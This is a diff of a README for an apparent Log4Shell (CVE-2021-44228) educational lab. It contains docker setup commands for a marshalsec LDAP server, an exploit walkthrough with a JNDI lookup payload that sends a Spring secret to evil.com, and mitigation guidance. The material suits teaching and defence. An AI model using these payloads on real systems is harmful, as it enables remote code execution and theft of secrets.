@@ -28,7 +28,7 @@ $ docker run -d --name log4shell-httpserver --network="log4shell" -p 3223:3223 -
 $ docker run -d --name log4shell-marshalsec --network="log4shell" -p 1389:1389 log4shell-marshalsec "http://<HostIp>:<Port>/#<RCEObjectName>"
 ```
 
-### 4. Exploit
+## Exploit
 Open up the vulnerable application, input some false test credentials, and open up the
 logs of the **log4shell-vulnapp** container.
 It can be seen that the application is logging unsuccessful login attempts (e.g., *Incorrect login attempt for username 'test'*). From this small experiment, it is established that we have control over some part of the logged string (i.e., the username).
@@ -54,7 +54,7 @@ ${jndi:ldap://${spring:supersecretkey}.evil.com/foo}
 ```
 **Note:** The spring lookup attack string requires **log4j-spring-cloud-config-client** be included in the application. [[2]](#2)
 
-### 5. Mitigation
+## Mitigation
 The best way to mitigate this serious vulnerability is to upgrade log4j2 to a version **>= 2.17.0**. However, it is possible to completely mitigate the issue without upgrading using two different methods. It is strongly recommended to vendors that cannot upgrade to a newer Log4j2 version **to use both mitigation methods** specified below [[1]](#1).
 
 ### Method 1: For log4j 2.10.0 or later - Disable lookups
@@ -65,7 +65,7 @@ Alternatively, lookups can be disabled for a specific invocation of the JVM by a
 ### Method 2: For log4j older than 2.10.0 - Removing the vulnerable class
 When using a log4j version older than 2.10.0, it is possible to remove the **JndiLookup** class from any Java applications.
 
-### References
+## References
 <a id="1">[1]</a> Menashe, S., (2021). All About Log4Shell 0-Day Vulnerability - CVE-2021-44228. [online] JFrog. Available at: <https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know> [Accessed 24 December 2021].
 
 <a id="2">[2]</a> Goers, R., (2021). Log4j – Log4j 2 Lookups. [online] logging.apache.org. Available at: <https://logging.apache.org/log4j/2.x/manual/lookups.html> [Accessed 24 December 2021].
